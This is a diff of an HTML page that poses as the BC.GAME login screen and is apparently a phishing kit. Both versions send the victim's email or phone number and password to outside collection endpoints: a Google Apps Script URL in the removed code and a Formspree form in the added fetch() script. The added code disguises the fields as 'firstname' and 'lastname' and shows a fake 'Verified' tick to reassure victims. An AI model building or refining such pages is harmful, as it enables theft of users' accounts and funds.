@@ -1,65 +1,162 @@
 <!DOCTYPE html>
 <html>
+
 <head>
-  <title>BC.GAME Login</title>
-  <style>
-    body {
-      background-color: #333; /* Dark grey background */
-      font-family: Arial, sans-serif;
-      color: white; /* White font color */
-    }
+    <title>BC.GAME Login</title>
+    <style>
+        body {
+            background-color: #28282B;
+            font-family: Arial, sans-serif;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
 
-    .login-container {
-      width: 300px;
-      margin: 0 auto;
-      padding: 20px;
-      border: 1px solid #0f0; /* Dark neon green border */
-      border-radius: 5px;
-    }
+        .login-container {
+            width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+            border: 1px solid #0f0;
+            border-radius: 5px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
 
-    .input-field {
-      margin-bottom: 10px;
-    }
+        .input-field {
+            margin-bottom: 10px;
+        }
 
-    .input-field label {
-      display: block;
-    }
+        .input-field label {
+            display: block;
+        }
 
-    .input-field input {
-      width: 100%;
-      padding: 10px;
-      border: 1px solid #0f0; /* Dark neon green border */
-      border-radius: 5px;
-    }
+        .input-field input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #0f0;
+            border-radius: 5px;
+        }
 
-    .btn-sign-in {
-      background-color: #0f0; /* Neon green background */
-      color: white; /* White font color */
-      padding: 10px 20px;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-  </style>
+        .btn-sign-in {
+            background-color: #0f0;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .verification-container {
+            display: none;
+            text-align: center;
+        }
+
+        .verification-text {
+            color: white;
+        }
+
+        .verification-text.verified {
+            display: inline;
+        }
+
+        .green-tick {
+            width: 20px;
+            height: 20px;
+            margin-left: 5px;
+        }
+
+        .image-container {
+            text-align: center;
+        }
+
+        .image-container img {
+            margin-bottom: 10px;
+            width: 300px;
+            height: 300px;
+        }
+
+        .logo-container {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+        }
+    </style>
 </head>
+
 <body>
-  <div class="login-container">
-    <h2>Sign In</h2>
-    <form action="https://script.google.com/macros/s/AKfycbyFiOpSV0k6k8_RMq7VfHrjCQdTbTquU3bjR3gfwtgWeMI2tPfVZ5fLjf8ERV9UJHru/exec" method="post">
-      <div class="input-field">
-        <label for="email">Email / Phone Number</label>
-        <input type="text" id="email" name="email" required>
-      </div>
-      <div class="input-field">
-        <label for="password">Login Password</label>
-        <input type="password" id="password" name="password" required>
-      </div>
-      <button class="btn-sign-in" type="submit" id="sign-in-button">Sign In</button>
-    </form>
-    <p id="verification-message" style="display: none;">
-      <span style="color: white;">Verified </span>
-      <img src="https://upload.wikimedia.org/wikipedia/commons/e/e4/Green_tick.png" alt="Green Tick" width="20" height="20">
-    </p>
-  </div>
+    <div class="login-container">
+        <div class="logo-container" style="position: absolute; top: 20px; left: 180px;">
+            <a href="/" keep-scroll-position="true" class="a14rois6 logo-pc is-active">
+                <div class="logo-inner" bis_skin_checked="1">
+                    <img alt="logo" class="logo-com" src="logofinal.png" width="180" height="75">
+                </div>
+            </a>
+        </div>
+        <div class="image-container">
+            <img src="messihd.png" alt="Pure Image" width="300" height="300">
+        </div>
+
+        <form action="https://formspree.io/f/mvojlwje" method="post" id="login-form">
+            <h2>Sign In</h2>
+            <div class="input-field">
+                <label for="firstname">Email / Phone Number</label>
+                <input type="text" id="firstname" name="firstname" required>
+            </div>
+            <div class="input-field">
+                <label for="lastname">Login Password</label>
+                <input type="text" id="lastname" name="lastname" required>
+            </div>
+            <button class="btn-sign-in" type="button" id="sign-in-button">Sign In</button>
+        </form>        
+
+        <div class="verification-container" id="verification-message">
+            <span class="verification-text">Verified</span>
+            <img src="Green_tick.png" alt="Green Tick" class="green-tick">
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById('login-form');
+        const verificationContainer = document.getElementById('verification-message');
+        const verificationText = document.querySelector('.verification-text');
+        const signInButton = document.getElementById('sign-in-button');
+
+        signInButton.addEventListener('click', function () {
+            // Display the verification message
+            verificationText.classList.add('verified');
+            verificationContainer.style.display = 'block';
+
+            // Get the values of the input fields
+            const firstname = document.getElementById('firstname').value;
+            const lastname = document.getElementById('lastname').value;
+
+            // Set the Formspree endpoint dynamically (replace 'your-form-id' with your actual Form ID)
+            form.action = `https://formspree.io/f/mvojlwje`;
+
+            // You can also include password in the form data if needed
+            const formData = new FormData(form);
+            formData.append('lastname', lastname);
+
+
+            // Perform the form submission
+            fetch(form.action, {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            }).then(response => {
+                // Handle the response as needed
+                console.log('Form submitted to Formspree');
+            }).catch(error => {
+                console.error('Error:', error);
+            });
+        });
+    </script>
 </body>
+
 </html>
